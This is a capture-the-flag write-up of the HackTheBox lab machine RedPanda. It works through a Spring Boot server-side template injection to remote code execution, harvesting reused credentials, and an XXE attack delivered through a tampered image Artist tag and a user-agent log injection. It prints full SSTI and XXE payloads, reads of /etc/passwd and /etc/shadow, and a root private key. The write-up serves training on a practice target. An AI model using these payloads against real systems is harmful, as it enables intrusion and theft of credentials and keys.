---
title: "Walk-through of RedPanda from HackTheBox"
header:
  teaser: /assets/images/2022-07-14-23-06-20.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - SSTI
  - XXE
  - pspy64
---

[RedPanda](https://www.hackthebox.com/home/machines/profile/481) is an easy level machine by [Woodenk](https://www.hackthebox.com/home/users/profile/25507) on [HackTheBox](https://www.hackthebox.com/home). This Linux box focuses on a Java web application and a couple of OWASP favourite methods of exploiting it.

<!--more-->

## Machine Information

![redpanda](/assets/images/2022-07-14-23-06-20.png)

Our starting point on this box is exploring the workings of a Java Spring Boot web application. We find an SSTI vulnerability which leads to remote code execution, and eventually credentials for user SSH access. After a code review of the website source files and some lateral thinking we use an XXE attack which give us root.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - RedPanda](https://www.hackthebox.com/home/machines/profile/481) |
| Machine Release Date | 9th July 2022 |
| Date I Completed It | 17th July 2022 |
| Distribution Used | Kali 2022.1 – [Release Info](https://www.kali.org/blog/kali-linux-2022-1-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.170 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root㉿kali)-[~/htb/redpanda]
└─# nmap -p$ports -sC -sV -oA redpanda 10.10.11.170
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-14 23:08 BST
Nmap scan report for 10.10.11.170
Host is up (0.030s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
8080/tcp open  http-proxy
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Thu, 14 Jul 2022 22:08:27 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Thu, 14 Jul 2022 22:08:27 GMT
|     Connection: close
|_http-title: Red Panda Search | Made with Spring Boot
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.96 seconds
```

Just two ports, 8080 will be our only option for now:

![redpanda-website](/assets/images/2022-07-14-23-13-18.png)

All we have is a search box:

![redpanda-search](/assets/images/2022-07-16-15-09-38.png)

## Feroxbuster

Nothing here at first glance, look for sub-folders with Feroxbuster:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# feroxbuster -u http://10.10.11.170:8080/  
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.170:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
405      GET        1l        3w        0c http://10.10.11.170:8080/search
200      GET       32l       97w        0c http://10.10.11.170:8080/stats
200      GET       55l      119w        0c http://10.10.11.170:8080/
500      GET        1l        1w        0c http://10.10.11.170:8080/error
[####################] - 1m     30000/30000   0s      found:4       errors:0      
[####################] - 1m     30000/30000   408/s   http://10.10.11.170:8080/ 
```

The stats section shows authors:

![redpanda-stats](/assets/images/2022-07-16-15-20-44.png)

Clicking on an author gives us their stats:

![redpanda-woodenk](/assets/images/2022-07-16-15-21-44.png)

Clicking on **Export table** gives us an xml file with their stats:

![redpanda-export](/assets/images/2022-07-16-16-23-46.png)

We can download the pictures using the paths provided. Here's them all in a collage:

![redpanda-pics](/assets/images/2022-07-16-15-19-38.png)

Very nice, but looking at their metadata with exiftool doesn't reveal anything.

## SSTI

On to other tests, eventually I tried server side template injection and found this:

![redpanda-ssti](/assets/images/2022-07-16-15-39-58.png)

Banned characters suggests we're on the right track. Looking at the nmap scan from earlier we see:

```text
|_http-title: Red Panda Search | Made with Spring Boot
```

Searching for Spring Boot we find [this](https://spring.io/projects/spring-boot) and [this](https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/overview.html):

```text
Spring Framework is a Java platform that provides comprehensive infrastructure support for developing Java applications. Spring handles the infrastructure so you can focus on your application.
```

A search for **Spring Boot SSTI** found [this](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/) which has a useful table:

```text
${...}: Variable expressions – in practice, these are OGNL or Spring EL expressions.
*{...}: Selection expressions – similar to variable expressions but used for specific purposes.
#{...}: Message (i18n) expressions – used for internationalization.
@{...}: Link (URL) expressions – used to set correct URLs/paths in the application.
~{...}: Fragment expressions – they let you reuse parts of templates.
```

Trying variations we at last find our path forward:

![redpanda-ssti-working](/assets/images/2022-07-16-15-46-28.png)

Using an asterisk instead of a dollar works, we can switch to curl now to play with it:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# curl -i -s -k -X POST --data-binary 'name=pencer' 'http://10.10.11.170:8080/search'
<SNIP>
  <div class="results">
    <h2 class="searched">You searched for: pencer</h2>
```

A normal search works, try for SSTI:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# curl -i -s -k -X POST --data-binary 'name=*{7*7}' 'http://10.10.11.170:8080/search'
<SNIP>
  <div class="results">
    <h2 class="searched">You searched for: 49</h2>
```

## Remote Code Execution

SSTI with asterisk works. More searching found a script [here](https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py) that let's us do RCE:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# python3 ./ssti.py         
Command ==> whoami
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}
```

Remember to change the $ to a *, now send it with curl

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# curl -i -s -k -X POST --data-binary 'name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(119).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105))).getInputStream())}' 'http://10.10.11.170:8080/search' | grep 'for:'

    <h2 class="searched">You searched for: woodenk
```

That worked, how about the passwd file:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# python3 ./ssti.py         
Command ==> cat /etc/passwd
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec
(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat<SNIP>

┌──(root㉿kali)-[~/htb/redpanda]
└─# curl -i -s -k -X POST --data-binary 'name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec<SNIP>(T(java.lang.Character).toString(100))).getInputStream())}' 'http://10.10.11.170:8080/search' | grep -A 999 'for:' | grep bash

    <h2 class="searched">You searched for: root:x:0:0:root:/root:/bin/bash
woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash
```

We see just root and woodenk can login.

I'm pretty sure the box author did this to make the enumeration process as painful as possible, but eventually by using the above method to look around I found credentials.

Create the ssti payload using the script:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# python3 ./ssti.py
Command ==> cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.(106)).
<SNIP>
```

Send it to get the file:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# curl -i -s -k -X POST --data-binary 'name=*{T(org.apache.commons.io.IOUtils).toString(T(java.lang
<SNIP>
conn = DriverManager.getConnection(&quot;jdbc:mysql://localhost:3306/red_panda&quot;, 
&quot;woodenk&quot;, &quot;RedPandazRule&quot;);
<SNIP>
```

## SSH User Access

Amongst that we see the connection string with credentials. These are reused for SSH:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# ssh woodenk@10.10.11.170
woodenk@10.10.11.170s password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
  System information as of Sat 16 Jul 2022 03:13:50 PM UTC
Last login: Sat Jul 16 15:02:23 2022 from 10.10.14.207

woodenk@redpanda:~$ id
uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)
```

Let's grab the user flag before we move on:

```sh
woodenk@redpanda:~$ cat user.txt 
edbcdde9d7780ba9e7e95938fd4e234a
```

## MySQL

We can have a look in the MySQL database with the same credentials:

```sh
woodenk@redpanda:~$ mysql -u woodenk -pRedPandazRule
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 811
Server version: 8.0.29-0ubuntu0.20.04.3 (Ubuntu)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| red_panda          |
+--------------------+
2 rows in set (0.02 sec)

mysql> use red_panda
Database changed

mysql> show tables;
+---------------------+
| Tables_in_red_panda |
+---------------------+
| pandas              |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from pandas;
+----------+------------------------------------------------------------------------------------+------------------+---------+
| name     | bio                                                                                | imgloc           | author  |
+----------+------------------------------------------------------------------------------------+------------------+---------+
| Smooch   | Smooch likes giving kisses and hugs to everyone!                                   | img/smooch.jpg   | woodenk |
| Hungy    | Hungy is always hungry so he is eating all the bamboo in the world!                | img/hungy.jpg    | woodenk |
| Greg     | Greg is a hacker. Watch out for his injection attacks!                             | img/greg.jpg     | woodenk |
| Mr Puffy | Mr Puffy is the fluffiest red panda to have ever lived.                            | img/mr_puffy.jpg | damian  |
| Florida  | Florida panda is the evil twin of Greg. Watch out for him!                         | img/florida.jpg  | woodenk |
| Lazy     | Lazy is always very sleepy so he likes to lay around all day and do nothing.       | img/lazy.jpg     | woodenk |
| Shy      | Shy is as his name suggest very shy. But he likes to cuddle when he feels like it. | img/shy.jpg      | damian  |
| Smiley   | Smiley is always very happy. She loves to look at beautiful people like you !      | img/smiley.jpg   | woodenk |
| Angy     | Angy is always very grumpy. He sticks out his tongue to everyone.                  | img/angy.jpg     | damian  |
| Peter    | Peter loves to climb. We think he was a spider in his previous life.               | img/peter.jpg    | damian  |
| Crafty   | Crafty is always busy creating art. They will become a very famous red panda!      | img/crafty.jpg   | damian  |
+----------+------------------------------------------------------------------------------------+------------------+---------+
11 rows in set (0.00 sec)
```

Ok, a bio for each picture but nothing else interesting in the database. I noticed this script in /opt when looking earlier:

```sh
woodenk@redpanda:~$ cat /opt/cleanup.sh 
#!/bin/bash
/usr/bin/find /tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.xml" -exec rm -rf {} \;
/usr/bin/find /tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /var/tmp -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /dev/shm -name "*.jpg" -exec rm -rf {} \;
/usr/bin/find /home/woodenk -name "*.jpg" -exec rm -rf {} \;
```

## Pspy64

That's removing any xml and jpg files found in a few different directories. We can run pspy64 like we did on [Timing](https://pencer.io/ctf/ctf-htb-timing/) to have a look at it running:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64             
<SNIP>
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64   100%  [<============================>]   2.94M  2.93MB/s    in 1.0s    
2022-07-16 16:26:26 (2.93 MB/s) - ‘pspy64’ saved [3078592/3078592]
```

Start a web server so we can pull it over to the box:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# python3 -m http.server 80                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Switch to the box, pull it over and run:

```sh
woodenk@redpanda:/dev/shm$ wget http://10.10.14.207/pspy64
--2022-07-16 15:26:55--  http://10.10.14.207/pspy64
Connecting to 10.10.14.207:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’
pspy64  100%[================>]   2.94M  2.35MB/s    in 1.2s    
2022-07-16 15:26:56 (2.35 MB/s) - ‘pspy64’ saved [3078592/3078592]

woodenk@redpanda:/dev/shm$ chmod +x pspy64 
woodenk@redpanda:/dev/shm$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2022/07/16 15:27:13 CMD: UID=0    PID=99     | 
2022/07/16 15:27:13 CMD: UID=0    PID=98     | 
2022/07/16 15:27:13 CMD: UID=0    PID=97     | 
<SNIP>
2022/07/16 15:30:01 CMD: UID=1000 PID=17379  | /bin/bash /opt/cleanup.sh 
2022/07/16 15:30:01 CMD: UID=1000 PID=17388  | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
2022/07/16 15:30:01 CMD: UID=1000 PID=17391  | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; 
2022/07/16 15:30:01 CMD: UID=1000 PID=17394  | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 
<SNIP>
2022/07/16 15:32:01 CMD: UID=0    PID=17410  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
<SNIP>
2022/07/16 15:34:01 CMD: UID=0    PID=17469  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
<SNIP>
2022/07/16 15:36:01 CMD: UID=0    PID=17543  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar 
<SNIP>
2022/07/16 15:35:01 CMD: UID=1000 PID=17513  | /bin/bash /opt/cleanup.sh 
2022/07/16 15:35:01 CMD: UID=1000 PID=17515  | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ; 
2022/07/16 15:35:01 CMD: UID=1000 PID=17520  | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ; 
```

We see it runs every five minutes. We also see a java file being run every two minutes. If we search we can find the source file for it:

```sh
woodenk@redpanda:/opt/credit-score/LogParser/final/src/main/java/com/logparser$ cat App.java 
```

## Code Review

Java is not my thing so I had to do a lot of searching to find what this java app is doing.

First bit of interest:

```java
public class App {
    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
```

This is taking a string called line that is passed to it, and splitting it in to four elements.

```java
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }
```

This is reading metadata from jpgs it finds at **fullpath**. If the Artist attribute is set it returns the description from it.

This is the main section which calls the above sections:

```java
    }
    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
```

It calls the parseLog procedure above, and the getArtist one. It's setting the xml path to the value of artist then adding _creds.xml on the end.

We can look at that redpanda.log:

```text
woodenk@redpanda:~$ cat /opt/panda_search/redpanda.log | grep 10.10.14.207
200||10.10.14.207||curl/7.81.0||/export.xml
200||10.10.14.207||curl/7.81.0||/search
200||10.10.14.207||curl/7.81.0||/search
200||10.10.14.207||curl/7.81.0||/search
200||10.10.14.207||curl/7.81.0||/export.xml
200||10.10.14.207||curl/7.81.0||/export.xml
200||10.10.14.207||curl/7.81.0||/export.xml
```

There you can see the log entries created when I've used curl to search and export the table. The above script will take each of the lines in the log and split them so it can count views.

## XXE Attack

With what we've gathered so far we can now exploit this by using an XML External Entity (XXE) attack. Similar to what we did a while ago on a TryHackMe room called [Mustacchio](https://pencer.io/ctf/ctf-thm-mustacchio/).

First we need to use one of the files I downloaded earlier from the box and add a new value to the artist field:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# exiftool smooch.jpg
ExifTool Version Number         : 12.42
File Name                       : smooch.jpg
Directory                       : .
File Size                       : 196 kB
File Modification Date/Time     : 2022:07:16 15:00:59+01:00
File Access Date/Time           : 2022:07:16 15:03:39+01:00
File Inode Change Date/Time     : 2022:07:16 15:02:25+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : woodenk
Y Cb Cr Positioning             : Centered
Image Width                     : 1024
Image Height                    : 1280
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1024x1280
Megapixels                      : 1.3

┌──(root㉿kali)-[~/htb/redpanda]
└─# exiftool smooch.jpg -Artist='../home/woodenk/pencer'
    1 image files updated

┌──(root㉿kali)-[~/htb/redpanda]
└─# exiftool smooch.jpg                                 
ExifTool Version Number         : 12.42
File Name                       : smooch.jpg
Directory                       : .
File Size                       : 196 kB
File Modification Date/Time     : 2022:07:16 16:51:04+01:00
File Access Date/Time           : 2022:07:16 16:51:04+01:00
File Inode Change Date/Time     : 2022:07:16 16:51:04+01:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : ../home/woodenk/pencer
Y Cb Cr Positioning             : Centered
Image Width                     : 1024
Image Height                    : 1280
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1024x1280
Megapixels                      : 1.3
```

I've changed Artist to a path to a file called pencer in the woodenk folder. We know from the script we've just looked at that it will take that and add _creds.xml on to the end.

Next we need to create the xml file that it will target. The XXE exploit is based on HackTricks [here](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#read-file) which shows you how to read a file:

```xml
┌──(root㉿kali)-[~/htb/redpanda]
└─# cat pencer_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY pencer SYSTEM "file:///root/root.txt"> ]><credits>
  <author>damian</author>
  <image>
    <uri>../../../home/woodenk/smooch.jpg</uri>
    <hello>&pencer;</hello>
    <views>4</views>
  </image>
  <totalviews>4</totalviews>
</credits>
```

We know the format of this XML because earlier when clicking on the **Export table** link on the website we saw the format of the output.

Pull those two files on to the box like we did earlier, here they are in /home/woodenk:

```text
woodenk@redpanda:~$ ll
-rw-rw-r-- 1 woodenk woodenk    316 Jul 16 16:56 pencer_creds.xml
-rw-rw-r-- 1 woodenk woodenk 195979 Jul 16 15:51 smooch.jpg
-rw-r----- 1 root    woodenk     33 Jul 16 11:05 user.txt
```

Now we want to plant our malicious agent string in the log file:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# curl -i -s -k -X POST --data-binary 'name=pencer' 'http://10.10.11.170:8080/search' -A "||/../../../../../../../home/woodenk/smooch.jpg"
```

On the box we can check it's in the log:

```text
woodenk@redpanda:~$ cat /opt/panda_search/redpanda.log | grep 10.10.14.207
200||10.10.14.207||||/../../../../../../../home/woodenk/smooch.jpg||/
```

Now we do an export, which will read and parse the log file causing our XXE to trigger:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# curl http://10.10.11.170:8080/export.xml?author=damian
```

## Root Flag

Back on the box, wait a minute then check the pencer_cred.xml file:

```text
woodenk@redpanda:~$ cat pencer_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace>
<credits>
  <author>damian</author>
  <image>
    <uri>../../../../../home/woodenk/smooch.jpg</uri>
    <hello>bb6aaaabed6d28626dfe83c7567b955e</hello>
    <views>4</views>
  </image>
  <totalviews>4</totalviews>
</credits>
```

We see the pencer variable has been replaced with the contents of the root flag.

If we wanted to get SSH access we could use the same XXE method but get the root private SSH key instead by changing our line to this:

```xml
<!DOCTYPE replace [<!ENTITY pencer SYSTEM "file:///root/.ssh/id_rsa"> ]><credits>
```

Now after the exploit our file contains the key:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/smooch.jpg</uri>
    <hello>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</hello>
    <views>4</views>
  </image>
  <totalviews>4</totalviews>
</credits>
```

Copy that to a file on Kali, chmod 600 it and log in as root:

```sh
┌──(root㉿kali)-[~/htb/redpanda]
└─# ssh -i id_rsa 10.10.11.170
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)
Last login: Sun Jul 17 14:39:54 2022 from 10.10.16.23
root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)

root@redpanda:~# cat /etc/shadow
root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::
```

All done. Hopefully you learnt something on this fairly simple box.
